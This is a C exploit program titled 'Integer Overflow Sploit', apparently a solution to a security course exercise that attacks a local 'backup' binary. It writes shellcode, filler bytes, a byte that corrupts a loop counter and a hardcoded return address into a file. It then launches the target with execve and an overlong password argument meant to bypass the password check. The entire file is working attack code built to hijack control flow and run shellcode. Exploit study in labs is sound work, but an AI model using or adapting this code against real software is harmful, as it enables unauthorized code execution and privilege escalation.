/*
 * Integer Overflow Sploit
 */
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define TARGET "/usr/local/bin/backup"
#define TESTING_PASSWORD "xf35+"
#define FILE_SIZE 2573// 2654
#include "shellcode.h"
int main(void)
{
  char *args[5];
  char *env[1];
  char *file_content; 
  char*  RETURN_ADDRESS;
  char* FILENAME;
  FILE* fp;
  int i;
  FILENAME = "hacker_boi.txt";
  RETURN_ADDRESS = "\x50\xd3\xbf\xff"; 
  file_content = malloc(FILE_SIZE * sizeof(char));
  memset(file_content, ' ', FILE_SIZE);
  
  // add shellcode
  strcpy(file_content, shellcode);

  // add filling
  for (i=0; i < 2519; i++) {
    strcat(file_content, "1");
  }

  // Overwrite first byte of variable i to point to RA of function
  strcat(file_content, "\x0b");

  // Overwrite function's return address to point to shellcode
  strcat(file_content, RETURN_ADDRESS);
  strcat(file_content, "\0");

  // Make file
  fp = fopen(FILENAME, "w");
  if (fp != NULL) {
    fputs(file_content, fp);
    fclose(fp);
  }

  args[0] = TARGET;
  args[1] = "backup";
  args[2] = FILENAME;

  // Password bypass
  args[3] =  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
  args[4] = NULL;
  env[0] = NULL;

  // execve() executes the target program by overwriting the
  // memory of the process in which execve() is executing, i.e., 
  // execve() should never return
  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");
  exit(0);
}
